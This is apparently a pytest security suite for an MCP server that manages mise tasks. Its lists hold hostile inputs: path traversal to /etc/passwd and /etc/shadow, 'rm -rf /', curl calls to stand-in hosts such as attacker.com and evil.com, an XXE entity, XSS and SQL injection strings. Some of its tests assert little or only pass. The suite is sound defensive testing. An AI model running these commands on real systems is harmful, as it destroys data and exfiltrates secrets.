"""
Input Validation Security Tests

Tests to ensure all user inputs are properly validated and sanitized
to prevent security vulnerabilities.
"""

import pytest
import asyncio
import tempfile
from pathlib import Path
from unittest.mock import patch

from wise_mise_mcp.server import (
    analyze_project_for_tasks,
    create_task,
    trace_task_chain,
    AnalyzeProjectRequest,
    CreateTaskRequest,
    TraceTaskChainRequest,
)


class TestInputValidation:
    """Security tests for input validation"""

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self):
        """Test that path traversal attacks are prevented"""
        
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "../../../../../../etc/shadow", 
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "....//....//....//etc/passwd",  # Double encoding attempt
            "/proc/self/environ",
            "/proc/version",
            "\\\\server\\share\\file",
        ]
        
        for malicious_path in malicious_paths:
            request = AnalyzeProjectRequest(project_path=malicious_path)
            result = await analyze_project_for_tasks(request)
            
            # Should return an error, not process the malicious path
            assert "error" in result
            assert "does not exist" in result["error"] or "invalid" in result["error"].lower()

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_command_injection_prevention(self):
        """Test prevention of command injection in task commands"""
        
        malicious_commands = [
            "echo 'hello'; rm -rf /",
            "echo 'hello' && cat /etc/passwd",
            "echo 'hello' | sh",
            "$(whoami)",
            "`rm -rf /`",
            "echo 'hello'; python -c \"import os; os.system('rm -rf /')\"",
            "echo 'hello' > /dev/null; curl malicious.com/steal",
            "echo $(curl attacker.com/payload)",
            "'; DROP TABLE users; --",
            "${IFS}cat${IFS}/etc/passwd",
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            for malicious_command in malicious_commands:
                request = CreateTaskRequest(
                    project_path=temp_dir,
                    task_name="test_injection",
                    description="Testing command injection",
                    commands=[malicious_command]
                )
                
                result = await create_task(request)
                
                # Commands should be safely stored, not executed during creation
                # The actual execution would be handled by mise, not our server
                if "error" not in result:
                    # If task creation succeeds, verify the command is stored as-is
                    # without being interpreted or executed
                    assert result.get("task_created") is True
                    # The malicious command should be stored but not executed

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_large_input_handling(self):
        """Test handling of extremely large inputs"""
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # Test very long project path
            long_path = temp_dir + "/" + "a" * 1000
            request = AnalyzeProjectRequest(project_path=long_path)
            result = await analyze_project_for_tasks(request)
            
            # Should handle gracefully without crashing
            assert isinstance(result, dict)
            
            # Test very long task description
            long_description = "x" * 10000
            request = CreateTaskRequest(
                project_path=temp_dir,
                task_name="test_long",
                description=long_description,
                commands=["echo 'test'"]
            )
            
            result = await create_task(request)
            assert isinstance(result, dict)
            
            # Test very long command
            long_command = "echo '" + "y" * 5000 + "'"
            request = CreateTaskRequest(
                project_path=temp_dir,
                task_name="test_long_cmd",
                description="Test long command",
                commands=[long_command]
            )
            
            result = await create_task(request)
            assert isinstance(result, dict)

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_null_byte_injection(self):
        """Test handling of null byte injection attempts"""
        
        null_byte_inputs = [
            "normal_path\x00malicious",
            "task_name\x00; rm -rf /",
            "description\x00$(curl evil.com)",
            "command\x00 && cat /etc/passwd",
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            for malicious_input in null_byte_inputs:
                # Test in project path
                request = AnalyzeProjectRequest(project_path=malicious_input)
                result = await analyze_project_for_tasks(request)
                assert isinstance(result, dict)
                
                # Test in task name
                request = CreateTaskRequest(
                    project_path=temp_dir,
                    task_name=malicious_input,
                    description="Test",
                    commands=["echo 'test'"]
                )
                result = await create_task(request)
                assert isinstance(result, dict)

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_unicode_and_encoding_attacks(self):
        """Test handling of various Unicode and encoding attacks"""
        
        unicode_attacks = [
            "test\u0000malicious",  # Null character
            "test\u001bmalicious",  # Escape character
            "test\u000amalicious",  # Newline
            "test\u000dmalicious",  # Carriage return
            "test\u0009malicious",  # Tab
            "test\ufeffmalicious",  # BOM
            "test\u200bmalicious",  # Zero-width space
            "тест",  # Cyrillic
            "テスト",  # Japanese
            "🔥💥🚨",  # Emojis
            "a" * 100 + "\ud83d\ude00",  # Long string with emoji
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            for unicode_input in unicode_attacks:
                try:
                    request = CreateTaskRequest(
                        project_path=temp_dir,
                        task_name=f"unicode_test_{hash(unicode_input)}",
                        description=unicode_input,
                        commands=[f"echo '{unicode_input}'"]
                    )
                    result = await create_task(request)
                    assert isinstance(result, dict)
                except UnicodeError:
                    # Unicode errors should be handled gracefully
                    pass

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_json_injection_prevention(self):
        """Test prevention of JSON injection attacks"""
        
        json_payloads = [
            '{"malicious": "payload"}',
            '"malicious_string"',
            '[1,2,3,"injection"]',
            '{"$where": "this.a == this.b"}',  # NoSQL injection attempt
            '{"\\u0000": "null_byte"}',
            '{"exec": "rm -rf /"}',
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            for json_payload in json_payloads:
                request = CreateTaskRequest(
                    project_path=temp_dir,
                    task_name="json_test",
                    description=json_payload,
                    commands=["echo 'test'"],
                    sources=[json_payload]
                )
                
                result = await create_task(request)
                assert isinstance(result, dict)
                
                # The JSON payload should be treated as plain text, not parsed

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_xml_and_html_injection(self):
        """Test handling of XML/HTML injection attempts"""
        
        xml_html_payloads = [
            "<script>alert('xss')</script>",
            "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM '/etc/passwd'>]>",
            "<img src=x onerror=alert('xss')>",
            "<!--malicious comment-->",
            "<![CDATA[malicious data]]>",
            "&lt;script&gt;alert('encoded')&lt;/script&gt;",
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            for payload in xml_html_payloads:
                request = CreateTaskRequest(
                    project_path=temp_dir,
                    task_name="xml_test",
                    description=payload,
                    commands=["echo 'test'"]
                )
                
                result = await create_task(request)
                assert isinstance(result, dict)

    @pytest.mark.security
    def test_input_sanitization_functions(self):
        """Test that input sanitization functions work correctly"""
        
        # These would test internal sanitization functions
        # For now, this documents the requirement
        
        dangerous_inputs = [
            "../../../etc/passwd",
            "$(rm -rf /)",
            "<script>alert('xss')</script>",
            "test\x00malicious",
            "'OR 1=1--",
        ]
        
        # In a real implementation, we would test:
        # 1. Path sanitization functions
        # 2. Command sanitization functions
        # 3. String sanitization functions
        # 4. Input validation functions
        
        for dangerous_input in dangerous_inputs:
            # Sanitized input should be safe
            # sanitized = sanitize_input(dangerous_input)
            # assert is_safe(sanitized)
            pass

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_type_confusion_attacks(self):
        """Test handling of type confusion attacks"""
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # Try to pass wrong types to function parameters
            
            # Pass list where string expected
            try:
                request = CreateTaskRequest(
                    project_path=temp_dir,
                    task_name=["list", "instead", "of", "string"],  # Wrong type
                    description="Test",
                    commands=["echo 'test'"]
                )
                # This should be caught by Pydantic validation
                result = await create_task(request)
            except (TypeError, ValueError):
                # Expected - type validation should catch this
                pass
            
            # Pass dict where string expected
            try:
                request = CreateTaskRequest(
                    project_path=temp_dir,
                    task_name={"malicious": "dict"},  # Wrong type
                    description="Test", 
                    commands=["echo 'test'"]
                )
                result = await create_task(request)
            except (TypeError, ValueError):
                # Expected - type validation should catch this
                pass

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_resource_exhaustion_prevention(self):
        """Test prevention of resource exhaustion attacks"""
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # Test handling of extremely large number of sources
            large_sources_list = [f"file_{i}.py" for i in range(10000)]
            
            request = CreateTaskRequest(
                project_path=temp_dir,
                task_name="resource_test",
                description="Test large sources list",
                commands=["echo 'test'"],
                sources=large_sources_list
            )
            
            # Should handle gracefully, possibly with limits
            result = await create_task(request)
            assert isinstance(result, dict)
            
            # Test extremely large number of dependencies
            large_deps_list = [f"dep_{i}" for i in range(1000)]
            
            request = CreateTaskRequest(
                project_path=temp_dir,
                task_name="deps_test", 
                description="Test large dependencies",
                commands=["echo 'test'"],
                depends=large_deps_list
            )
            
            result = await create_task(request)
            assert isinstance(result, dict)